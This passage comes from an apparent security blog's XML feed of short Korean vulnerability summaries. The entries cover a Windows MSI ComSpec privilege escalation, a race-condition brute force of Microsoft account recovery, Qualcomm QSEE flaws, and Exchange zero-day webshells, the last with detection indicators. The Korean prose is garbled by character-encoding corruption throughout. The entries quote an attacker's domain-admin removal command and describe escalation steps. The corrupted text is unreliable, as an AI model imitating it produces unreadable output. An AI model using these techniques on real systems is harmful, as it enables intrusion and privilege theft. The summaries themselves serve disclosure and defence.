í—¤ë” ê¸¸ì´ ì œí•œì— ì‹¤íŒ¨í•˜ê³  <code>extract_header_item</code> í•¨ìˆ˜ì—ì„œ stack buffer overflowê°€ ë°œìƒí•´ ì›ê²© ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§‘ë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì€ Request smuggling ë˜ëŠ” HTTP header injectionê³¼ ê°™ì€ ì·¨ì•½ì ìœ¼ë¡œ í—¤ë” ê¸¸ì´ë¥¼ ì¡°ì‘í•´ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>L0ch</tag>
      
      <tag>integer underflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Third-Party productsë¥¼ í™œìš©í•œ Windows MSI ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì </title>
    <link href="/2021/03/11/idioth/2021-03-11/"/>
    <url>/2021/03/11/idioth/2021-03-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://improsec.com/tech-blog/the-many-pitfalls-of-windows-msi-privilege-escalation-in-windows-78110server-and-a-range-of-third-party-products">The many pitfalls of Windows MSI - Privilege escalation in Windows 7/8.1/10/Server and a range of third-party products</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 7/8.1/10</li><li>Windows Server 2008/2012/2016/2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Windowsì˜ ì†Œí”„íŠ¸ì›¨ì–´ ì„¤ì¹˜, ìœ ì§€, ì œê±°ë¥¼ ìœ„í•œ ì¸ìŠ¤í†¨ëŸ¬ì¸ MSIì—ì„œ ì„œë“œ íŒŒí‹° ì• í”Œë¦¬ì¼€ì´ì…˜ì„ í†µí•´ ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>MSI íŒ¨í‚¤ì§€ê°€ ì„¤ì¹˜ë˜ëŠ” ë™ì•ˆ íŒ¨í‚¤ì§€ì˜ ë³µì‚¬ë³¸ì€ ìë™ìœ¼ë¡œ ìƒì„±ëœ ì´ë¦„ì„ ê°–ê³  ìˆ¨ê¹€ í´ë” <code>C:\Windows\Installer</code>ì— ìƒì„±ë©ë‹ˆë‹¤. ì‹œìŠ¤í…œì— ìˆëŠ” ëª¨ë“  ì‚¬ìš©ìë“¤ì€ <code>msiexec /fa C:\Windows\Installer\&lt;filename&gt;.msi</code> ëª…ë ¹ì„ ì‹¤í–‰í•˜ê±°ë‚˜ ê´€ë ¨ëœ API/COM í•¨ìˆ˜ë¥¼ ì§ì ‘ì ìœ¼ë¡œ í˜¸ì¶œí•˜ì—¬ íŒ¨í‚¤ì§€ë¥¼ ì¬ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>íŒ¨í‚¤ì§€ì— ë”°ë¼ ì¬ì„¤ì¹˜í•  ë•Œ <code>NT Authority/SYSTEM</code> ì»¨í…ìŠ¤íŠ¸ë¡œ ìƒˆë¡œìš´ MSIEXEC í”„ë¡œì„¸ìŠ¤ë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ì„¤ì¹˜ëœ ì„œë“œ íŒŒí‹° ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì¬ì„¤ì¹˜í•˜ëŠ” ë™ì•ˆ <code>NT Authority/SYSTEM</code> ì»¨í…ìŠ¤íŠ¸ì—ì„œ <code>cmd.exe</code>ê°€ í˜¸ì¶œë©ë‹ˆë‹¤. í•´ë‹¹ í”„ë¡œì„¸ìŠ¤ê°€ ì‹¤í–‰ë˜ëŠ” ë™ì•ˆ í”„ë¡œì„¸ìŠ¤ì— ë‚®ì€ ê¶Œí•œì˜ ì‚¬ìš©ìì— ì†í•˜ëŠ” í™˜ê²½ ë³€ìˆ˜ê°€ ì ìš©ë˜ì–´ìˆìŠµë‹ˆë‹¤. <code>C:\Windows\System32\cmd.exe</code>ë¡œ ì„¤ì •ë˜ì–´ ìˆëŠ” ë³€ìˆ˜ <code>ComSpec</code>ì˜ ê°’ì„ ë³€ê²½í•˜ë©´ <code>NT Authority/SYSTEM</code> ê¶Œí•œìœ¼ë¡œ <code>ComSpec</code>ì— ì„¤ì •ëœ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì‹¤í–‰ë©ë‹ˆë‹¤.</p><p><img src="/2021/03/11/idioth/2021-03-11/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>lpe</tag>
      
      <tag>idioth</tag>
      
      <tag>msi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Microsoft online service account takeover</title>
    <link href="/2021/03/10/fabu1ous/2021-03-10/"/>
    <url>/2021/03/10/fabu1ous/2021-03-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://thezerohack.com/how-i-might-have-hacked-any-microsoft-account">How I Might Have Hacked Any Microsoft Account</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Microsoft ê³„ì •</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Microsoft ê³„ì •ì˜ ê³„ì • ë³µêµ¬(ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì •) ê¸°ëŠ¥ì—ì„œ account takeover ì·¨ì•½ì ì´ ë°œê²¬ë˜ê³  íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤. Microsoft ê³„ì •ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¬ì„¤ì •í•˜ê¸° ìœ„í•´ì„  email í˜¹ì€ íœ´ëŒ€í°ìœ¼ë¡œ ë³´ì•ˆ ë¬¸ìë¥¼ ë°›ì•„ ì…ë ¥í•˜ëŠ” ì¸ì¦ ì ˆì°¨ë¥¼ ê±°ì³ì•¼ í•©ë‹ˆë‹¤. ë³´ì•ˆ ë¬¸ìëŠ” 7ìë¦¬ ìˆ«ìë¡œ ì´ 10^7 (ì²œë§Œ) ê°œì˜ ê²½ìš°ì˜ ìˆ˜ê°€ ìˆìŠµë‹ˆë‹¤.</p><p>ë‹¹ì—°íˆ Brute force ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ë³´ì•ˆ ë¬¸ì ì¸ì¦ ì‹œë„ íšŸìˆ˜ë¥¼ ì œí•œí•˜ì§€ë§Œ ì—¬ëŸ¬ IPë¥¼ ì´ìš©í•œ Web Application Race conditionì„ í†µí•´ ìš°íšŒê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì—¬ëŸ¬ IP ì£¼ì†Œë¡œë¶€í„° ë™ì‹œì— ì¸ì¦ requestë¥¼ ë³´ë‚´ëŠ” ë°©ë²•ì„ í†µí•´ ì œí•œ íšŸìˆ˜ë¥¼ ë„˜ì–´ì„  ì¸ì¦ ì‹œë„ë¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ê³µê²©ì„ ì„±ê³µì ìœ¼ë¡œ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ì„  ë‹¤ìŒê³¼ ê°™ì€ ì¡°ê±´ì„ ë§Œì¡±í•´ì•¼ í•©ë‹ˆë‹¤.</p><ol><li>Requestì˜ ì•”í˜¸í™” ë°©ì‹ì— ëŒ€í•œ ì§€ì‹ í•„ìš”í•¨.</li><li>ì¶©ë¶„í•œ ê°œìˆ˜ì˜ IP ì£¼ì†Œê°€ í•„ìš”í•¨.</li><li>ëª¨ë“  requestê°€ Microsoft Serverì— ë™ì‹œì— ë„ë‹¬í•´ì•¼ í•¨.</li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://thezerohack.com/hack-any-instagram">https://thezerohack.com/hack-any-instagram</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>race condition</tag>
      
      <tag>microsoft</tag>
      
      <tag>brute force</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] í€„ì»´ SoCì˜ ë³´ì•ˆ ì‹¤í–‰ í™˜ê²½ QSEEì—ì„œ ë°œê²¬ëœ 4ê°€ì§€ ì·¨ì•½ì </title>
    <link href="/2021/03/09/l0ch/2021-03-09/"/>
    <url>/2021/03/09/l0ch/2021-03-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://raelize.com/blog/qualcomm-ipq40xx-analysis-of-critical-qsee-vulnerabilities/">Qualcomm IPQ40xx: Analysis of Critical QSEE Vulnerabilities</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Qualcomm IPQ40xx Series</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Linksys, Netgear ë° Cisco ë“± ì—¬ëŸ¬ ì œì¡°ì—…ì²´ì—ì„œ ì‚¬ìš©í•˜ëŠ” Qualcommì˜ SoCì¸ IPQ40xx ì‹œë¦¬ì¦ˆ ì¹©ì—ì„œ ë°œê²¬ëœ ì—¬ëŸ¬ ì·¨ì•½ì ë“¤ì˜ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>í€„ì»´ì€ í”„ë¡œì„¸ì„œì™€ ì£¼ë³€ í•˜ë“œì›¨ì–´ ì¥ì¹˜ì˜ ì•ˆì •ì„±ì„ ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì´ ì‹¤í–‰ í™˜ê²½ì„ ë¶„ë¦¬í•©ë‹ˆë‹¤.</p><ul><li>QSEE(Qualcomm Secure Execution Environment) : í€„ì»´ì˜ <a href="https://ko.wikipedia.org/wiki/%EC%8B%A0%EB%A2%B0_%EC%8B%A4%ED%96%89_%ED%99%98%EA%B2%BD">Trusted Execution Environment(ì‹ ë¢° ì‹¤í–‰ í™˜ê²½)</a>ìœ¼ë¡œ, ì¼ë°˜ ì‹¤í–‰ í™˜ê²½ê³¼ ê²©ë¦¬ëœ ë³´ì•ˆ ì˜ì—­ì´ ì œê³µí•˜ëŠ” ì‹¤í–‰ í™˜ê²½ì´ë©° QSEEì™€ ê´€ë ¨ëœ ì½”ë“œ ë° ë°ì´í„°ëŠ” REEì—ì„œ ì•¡ì„¸ìŠ¤ê°€ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤.</li><li>REE(Rich Execution Environment) : ì¼ë°˜ ì‹¤í–‰ í™˜ê²½</li></ul><h3 id="CVE-2020-11256"><a href="#CVE-2020-11256" class="headerlink" title="CVE-2020-11256"></a>CVE-2020-11256</h3><p>SMC í•¸ë“¤ëŸ¬ <code>tzbsp_blow_fuses_and_reset()</code> ì€ ë‘ ê°œì˜ ì¸ì <code>arg1</code>, <code>arg2</code>ë¥¼ ë°›ìŠµë‹ˆë‹¤. í•´ë‹¹ í•¨ìˆ˜ëŠ” <code>arg2</code>ë¥¼ ì—­ì°¸ì¡°í•´ 1 ë˜ëŠ” 2ë¥¼ ê¸°ë¡í•˜ëŠ”ë°, <code>arg2</code>ê°€ REE ì˜ì—­ì˜ ë©”ëª¨ë¦¬ë¥¼ ê°€ë¦¬í‚¤ëŠ”ì§€ í™•ì¸í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</p><h3 id="CVE-2020-11257"><a href="#CVE-2020-11257" class="headerlink" title="CVE-2020-11257"></a>CVE-2020-11257</h3><p>SMC í•¸ë“¤ëŸ¬ <code>usb_calib()</code> ì˜ ì¸ì <code>arg1</code>ëŠ” ì‚­ì œë˜ì§€ ì•Šì€ ì¶œë ¥ í¬ì¸í„°ë¡œ, <code>arg1</code>ëŠ” ë©”ëª¨ë¦¬ <code>0x580e0</code>ì˜ ê°’ì¸ <code>0x787</code>ì„ ì“°ê¸° ìœ„í•´ ì—­ì°¸ì¡° ë˜ë©°  <code>arg1</code>ì´ REE ì˜ì—­ì˜ ë©”ëª¨ë¦¬ë¥¼ ê°€ë¦¬í‚¤ëŠ”ì§€ í™•ì¸í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</p><h3 id="CVE-2020-11258"><a href="#CVE-2020-11258" class="headerlink" title="CVE-2020-11258"></a>CVE-2020-11258</h3><p>SMC í•¸ë“¤ëŸ¬ <code>tzbsp_version_set()</code> í•¨ìˆ˜ëŠ” ë„¤ ê°œì˜ ì¸ìë¥¼ ë°›ìœ¼ë©° ì¸ì ê°’ì— ë”°ë¼  <code>arg3</code>ë¥¼ ì—­ì°¸ì¡°í•´ <code>0x0</code>, <code>0x5</code>, <code>0xfffffffc</code> ì¤‘ í•˜ë‚˜ë¥¼ ì”ë‹ˆë‹¤. ì´ë•Œ <code>arg3</code>ê°€ REE ì˜ì—­ì˜ ë©”ëª¨ë¦¬ë¥¼ ê°€ë¦¬í‚¤ëŠ”ì§€ í™•ì¸í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</p><h3 id="CVE-2020-11259"><a href="#CVE-2020-11259" class="headerlink" title="CVE-2020-11259"></a>CVE-2020-11259</h3><p>SMC í•¸ë“¤ëŸ¬ <code>tzbsp_version_set()</code> í•¨ìˆ˜ëŠ” ì„¸ ê°œì˜ ì¸ìë¥¼ ë°›ìŠµë‹ˆë‹¤. ì´ ì¤‘ <code>arg2</code>ì—ëŠ” <code>sub_87e90370</code> ì˜ ë°˜í™˜ ê°’ ë˜ëŠ” <code>sub_87e90370 | 0xF0000</code> ê°’ì„,<code>arg3</code>ì—ëŠ” <code>0x0</code>ì„ ì“°ê¸° ìœ„í•´ ê°ê° ì—­ì°¸ì¡° í•©ë‹ˆë‹¤. ì´ë•Œ <code>arg2</code>ì™€ <code>arg3</code>ê°€ REE ì˜ì—­ì˜ ë©”ëª¨ë¦¬ë¥¼ ê°€ë¦¬í‚¤ëŠ”ì§€ í™•ì¸í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</p><p>ìœ„ ë„¤ ê°€ì§€ ì·¨ì•½ì ì€ ëª¨ë‘ <code>SMC(Secure Monitor Call)</code> í•¸ë“¤ëŸ¬ì—ì„œ ë°œìƒí•œë‹¤ëŠ” ì ê³¼ ì¸ìë¡œ ì „ë‹¬ëœ í¬ì¸í„°ê°€ REE ì˜ì—­ì˜ ë©”ëª¨ë¦¬ì¸ì§€ í™•ì¸í•˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ê³µí†µì ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ì·¨ì•½ì ì„ ì•…ìš©í•˜ë©´ QSEEê°€ ì•¡ì„¸ìŠ¤ ê°€ëŠ¥í•œ ì„ì˜ì˜ ì£¼ì†Œì— ì œí•œëœ ì“°ê¸°ê°€ ê°€ëŠ¥í•˜ë©° QSEEì— êµ¬í˜„ëœ ë³´ì•ˆ ê¸°ë²•ì„ ìš°íšŒí•´ ì»¤ë„ ë° í•˜ë“œì›¨ì–´ì— ì§ì ‘ ì•¡ì„¸ìŠ¤ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>qualcomm</tag>
      
      <tag>L0ch</tag>
      
      <tag>limited memory overwrite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Microsoft Exchange server ì œë¡œ ë°ì´ ì·¨ì•½ì  ì•…ìš©</title>
    <link href="/2021/03/08/idioth/2021-03-08/"/>
    <url>/2021/03/08/idioth/2021-03-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.fireeye.com/blog/threat-research/2021/03/detection-response-to-exploitation-of-microsoft-exchange-zero-day-vulnerabilities.html">Detection and Response to Exploitation of Microsoft Exchange Zero-Day Vulnerabilities</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2021ë…„ 3ì›” 2ì¼ ì íŒ¨ì¹˜ ì´ì „ì˜ Microsoft Exchange Server<ul><li>2013 Cumulative Update 23</li><li>2016 Cumulative Update 18</li><li>2016 Cumulative Update 19</li><li>2019 Cumulative Update 7</li><li>2019 Cumulative Update 8</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Exchange Serverì˜ ì œë¡œ ë°ì´ ì·¨ì•½ì ì„ ì•…ìš©í•œ ê³µê²©ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ë°œê²¬ëœ í–‰ìœ„ëŠ” ì ‘ì† ìœ ì§€ë¥¼ ìœ„í•œ ì›¹ ì‰˜ ìƒì„±, ì›ê²© ì½”ë“œ ì‹¤í–‰, ì—”ë“œ í¬ì¸íŠ¸ ë³´ì•ˆ ì†”ë£¨ì…˜ íƒì§€ì…ë‹ˆë‹¤.</p><p>2021ë…„ 1ì›”ì— ë°œê²¬ëœ <code>help.aspx</code> ì›¹ ì‰˜ì€ FireEye xAgent, CarbonBlack, CrowdStrike Falcon ì—”ë“œ í¬ì¸íŠ¸ ì œí’ˆì„ íƒì§€í•˜ê³  ì¡´ì¬ ì—¬ë¶€ë¥¼ ì‘ì„±í•˜ëŠ” ì½”ë“œë¥¼ í¬í•¨í•©ë‹ˆë‹¤. í•´ë‹¹ ì›¹ ì‰˜ì€ CVE-2021-26858ì„ ì•…ìš©í•˜ì—¬ Microsoft Exchange Serverì˜ í†µí•© ë©”ì‹œì§• ì„œë¹„ìŠ¤ì¸ <code>UMWorkerProcess.exe</code>ë¥¼ í†µí•´ ìƒì„±ë©ë‹ˆë‹¤.</p><p>ë‹¤ë¥¸ ê³³ì—ì„œ ë°œê²¬ëœ <code>iisstart.apsx</code> ì›¹ ì‰˜ì€ ë¶€ë¶„ì ìœ¼ë¡œ ë‚œë…í™”ë˜ì–´ ìˆìœ¼ë©°, íŒŒì¼ ì‹œìŠ¤í…œê³¼ í†µì‹ í•˜ê¸° ìœ„í•œ ê¸°ëŠ¥, ì„ì˜ ëª…ë ¹ ì‹¤í–‰, ì—…ë¡œë“œ, ì‚­ì œ, íŒŒì¼ ë‚´ìš© í™•ì¸ ë“±ì˜ ê¸°ëŠ¥ì„ í¬í•¨í•©ë‹ˆë‹¤.</p><p>2021ë…„ 3ì›”ì—ëŠ” Exchange Serverì˜ ì—¬ëŸ¬ ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ ì—¬ëŸ¬ ê°œì˜ ì›¹ ì‰˜ì´ ì—…ë¡œë“œë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì›¹ ì‰˜ì€ Exchange ì›¹ í”„ë¡ íŠ¸ ì—”ë“œì™€ ê´€ë ¨ëœ IIS í”„ë¡œì„¸ìŠ¤ì¸ <code>w3wp.exe</code>ê°€ <code>cmd.exe</code>ë¥¼ ìƒì„±í•˜ê²Œ ë§Œë“­ë‹ˆë‹¤.</p><p>ìœ„ì˜ ë°œê²¬ëœ ì›¹ ì‰˜ ë‹¤ìˆ˜ëŠ” <code>Exchange Organization administrators</code> ê·¸ë£¹ì—ì„œ <code>administrator</code> ì‚¬ìš©ìë¥¼ ì‚­ì œí•˜ëŠ” <code>net group &quot;Exchange Organization administrators&quot; administrator /del /domain</code> ëª…ë ¹ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤. ë‹¨ì¼ ì‹œìŠ¤í…œ ë„ë©”ì¸ì„ ì‚¬ìš©í•˜ë©´, ë¡œì»¬ì—ì„œ í•´ë‹¹ ëª…ë ¹ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤.</p><p>Microsoftì—ì„œ ë°íŒ ì¶”ê°€ì ì¸ ì•…ìš© í–‰ìœ„ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ul><li>LSASS í”„ë¡œì„¸ìŠ¤ ë©”ëª¨ë¦¬ ë¤í”„ë¥¼ í†µí•œ ìê²© ì¦ëª… ë„ìš©</li><li>7zipì„ ì‚¬ìš©í•˜ì—¬ ìœ ì¶œ ë°ì´í„° ì••ì¶•</li><li>Exchange PowerShell Snapinì„ í†µí•´ mailbox data ì „ì†¡</li><li>ì›ê²© ì ‘ì†ì„ ìœ„í•´ ì¶”ê°€ì ìœ¼ë¡œ Covenant, Nishang, PowerCat ì‚¬ìš©</li></ul><p>Exchange Serverê°€ ì›¹ ì‰˜ì— ê³µê²©ì„ ë°›ì•˜ëŠ”ì§€ í™•ì¸í•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ul><li><code>C:\Windows\System32\inetsrv\w3wp.exe</code> í”„ë¡œì„¸ìŠ¤ê°€ <code>cmd.exe</code> ìì‹ í”„ë¡œì„¸ìŠ¤ë¥¼ ê°€ì§</li><li><code>w3wp.exe</code>ë‚˜ <code>UMWorkerProcess.exe</code>ì— ì˜í•´ íŒŒì¼ì´ ìƒì„±</li><li><code>SYSTEM</code> ì‚¬ìš©ìê°€ ì†Œìœ í•œ ASPX íŒŒì¼ì´ ì¡´ì¬</li><li><code>Temporary ASP.NET Files</code> ë””ë ‰í„°ë¦¬ì— ì²˜ìŒ ë³´ëŠ” ì»´íŒŒì¼ëœ ASPX íŒŒì¼ ì¡´ì¬</li><li>ë‹¤ìŒ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•´ ì™¸ë¶€ IPë¥¼ ê²€ì‚¬í•©ë‹ˆë‹¤.<ul><li><code>/rpc/</code> ë””ë ‰í„°ë¦¬</li><li><code>/ecp/DDI/DDIService.svc/SetObject</code></li><li>ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ë¦¬ì†ŒìŠ¤</li><li>ì˜ì‹¬ìŠ¤ëŸ½ê±°ë‚˜ ìŠ¤í‘¸í•‘ ëœ HTTP User-Agents</li></ul></li><li>ë©”ì¼ ë°•ìŠ¤ë¡œ ë‚´ë³´ë‚´ëŠ” ì˜ˆìƒì¹˜ ëª»í•˜ê±°ë‚˜ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ Exchange PowerShell Snapin requestê°€ ì¡´ì¬</li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] ë²„ê·¸í—ŒíŒ… íŠœí† ë¦¬ì–¼ Part 1</title>
    <link href="/2021/03/07/l0ch/bughunting-tutorial/"/>
    <url>/2021/03/07/l0ch/bughunting-tutorial/</url>
    
    <content type="html"><![CDATA[<p>ì•ˆë…•í•˜ì„¸ìš” L0chì…ë‹ˆë‹¤! ì˜¤ëŠ˜ì€ íŠ¹ë³„í•œ ê¸€ì„ ê°€ì ¸ì™€ë´¤ì–´ìš” ã…‹ã…‹ã…‹ ë°”ë¡œ ëŒ€í•™êµ ë™ì•„ë¦¬ ëŒ€-ì„ ë°°ë‹˜ì˜ ë²„ê·¸í—ŒíŒ…ì— ëŒ€í•œ ê¿€íŒì´ ë‹´ê²¨ìˆëŠ” ê¸€ì…ë‹ˆë‹¤!</p><p>ë•ŒëŠ” 2018ë…„.. ì•„ì§ ìƒˆë‚´ê¸° í‹°ë¥¼ ë²—ì–´ë‚˜ì§€ ëª»í•œ ì €ì—ê²Œ</p><blockquote><p>ìœˆë„ìš° ì·¨ì•½ì  ì°¾ì•„ë³¼ë˜?</p></blockquote><p>ë¼ë©° ì˜¬ë ¤ì£¼ì‹  ê¸€ì…ë‹ˆë‹¤ ã…ã…..  ë²„ê·¸í—ŒíŒ…ì— ëŒ€í•œ ì†Œê°œë¶€í„°, ëŒ€ìƒ ì„ ì •-ë¶„ì„-ìµìŠ¤í”Œë¡œì‡ ê¹Œì§€ ë²„ê·¸í—ŒíŒ… ë‰´ë¹„ë„ ì´í•´í•  ìˆ˜ ìˆë„ë¡ ì¹œì ˆí•˜ê²Œ ì„¤ëª…ì´ ë˜ì–´ ìˆì–´ ë„ì›€ì´ ë§ì´ ë˜ì—ˆì£ . (ê·¸ë• ëª°ëì§€ ì•ìœ¼ë¡œ ìœˆë„ìš°ë¡œ ê³ í†µë°›ê²Œ ë ì§€â€¦..)</p><p>ì—¬íŠ¼ ê·¸ë˜ì„œ í—ˆë½ì„ êµ¬í•˜ê³  ì˜¬ë¦¬ê²Œ ë˜ì—ˆìœ¼ë©° ì‹œë¦¬ì¦ˆê°€ ê¸´ ë§Œí¼ ë‚˜ëˆ„ì–´ì„œ ì˜¬ë¦´ ì˜ˆì •ì…ë‹ˆë‹¤. ê²Œì‹œë¥¼ í—ˆë½í•´ì£¼ì‹  ì„ ë°°ë‹˜ê»˜ ë‹¤ì‹œ í•œë²ˆ ê°ì‚¬ì˜ ë§ì”€ì„ ë“œë¦¬ë©° ì‹œì‘í•˜ê² ìŠµë‹ˆë‹¤!</p><hr><h1 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h1><p>ìŒ ë²„ê·¸í—ŒíŒ… íŠœí† ë¦¬ì–¼ì´ë¼ëŠ” ê±°ì°½í•œ ì œëª©ì„ í•´ë„ ë ì§€ ëª¨ë¥´ê² ì§€ë§Œ ã…‹ã…‹ã…‹ ì œê°€ ì°¾ì•˜ë˜ ì·¨ì•½ì ì„ ì˜ˆì‹œë¡œ ë²„ê·¸í—ŒíŒ… ê³¼ì •ì— ëŒ€í•´ì„œ ì–˜ê¸°í•´ ë³´ê³ ì í•©ë‹ˆë‹¤.</p><p>ë­ ëŒ€ë‹¨í•œ ê²Œ ì•„ë‹ˆë¼ ê·¸ëƒ¥ ì œê°€ ì–´ë–»ê²Œ ì·¨ì•½ì ì„ ì°¾ì•˜ê³  ìµìŠ¤í”Œë¡œì‡ì„ ì–´ë–»ê²Œ í–ˆëŠ”ì§€ ì •ë„? í‚¤ì‚¬ ë³´ê³ ì„œ ì“°ëŠ” íŒë„ ì¢€ ì¨ë³´ë ¤ê³  í•˜ë‹¤ê°€ ê·¸ëƒ¥ ë³´ê³ ì„œëŠ” ìµœëŒ€í•œ ìì„¸íˆ ë§ì´ ì“°ëŠ” ê²Œ ë‹µì¸ ê±° ê°™ì•„ ì´ ë¶€ë¶„ì€ ë¹¼ê³  ì–˜ê¸°í•  ê±° ê°™ë„¤ìš” ã…‹ã…‹</p><p>ìµœê·¼ì—ëŠ” ê³µìœ ê¸°ë‘ ë­ IOTê°€ ëŒ€ì„¸ì—¬ì„œ ì£¼ë³€ì— ì´ë ‡ê²Œ ìœˆë„ìš° í”„ë¡œê·¸ë¨ ë²„ê·¸ í—ŒíŒ…í•˜ì‹œëŠ” ë¶„ë“¤ì„ ë§ì´ ë´¤ì§€ë§Œ ìœˆë„ìš° í”„ë¡œê·¸ë¨ ë²„ê·¸í—ŒíŒ…ì„ ì‹œì‘í•˜ì‹œë ¤ëŠ” ë¶„ë“¤ê»˜ ë„ì›€ì´ ë˜ì—ˆìœ¼ë©´ í•©ë‹ˆë‹¤ ã…ã… (ê·¸ë˜ë„ ê³µìœ ê¸°ê°€ ê°œê¿€ì„ ã… ã… )</p><p>ì´ ê¸€ì€ ì½ìœ¼ì‹œëŠ” ë¶„ë“¤ì´ ê¸°ë³¸ì ìœ¼ë¡œ í•´í‚¹ì— ëŒ€í•œ ê¸°ë³¸ì§€ì‹ì´ ìˆë‹¤ëŠ” ì „ì œ í•˜ì— ì“°ê² ìŠµë‹ˆë‹¤. ì›Œê²Œì„ë„ í’€ì–´ë³´ê³  ë¦¬ë²„ì‹± ì¢€ í•  ìˆ˜ ìˆê³  ì •ë„â€¦.? ê·¸ë¦¬ê³  ë²„ê·¸í—ŒíŒ…ì„ ì•„ì˜ˆ ì•ˆ í•´ë³´ì‹  ë¶„ë“¤? ì• ë§¤í•˜ì§€ë§Œâ€¦ ê·¸ë˜ë„ ìµœëŒ€í•œ ì‰½ê²Œ ìì„¸í•˜ê²Œ ì“°ë ¤ê³  ë…¸ë ¥í•´ë³¼ê²Œìš”.</p><h1 id="â€»-ê¸€-ì½ì„-ë•Œ-ì£¼ì˜ì‚¬í•­-â€»"><a href="#â€»-ê¸€-ì½ì„-ë•Œ-ì£¼ì˜ì‚¬í•­-â€»" class="headerlink" title="â€» ê¸€ ì½ì„ ë•Œ ì£¼ì˜ì‚¬í•­ â€»"></a>â€» ê¸€ ì½ì„ ë•Œ ì£¼ì˜ì‚¬í•­ â€»</h1><ol><li>ì´ ê¸€ì€ ì œ ê²½í—˜ì„ ë°”íƒ•ìœ¼ë¡œ ì“°ëŠ” ê²ƒì´ê¸° ë•Œë¬¸ì— í˜¹ì‹œ ë” ì¢‹ì€ ë°©ë²•ì´ë‚˜ 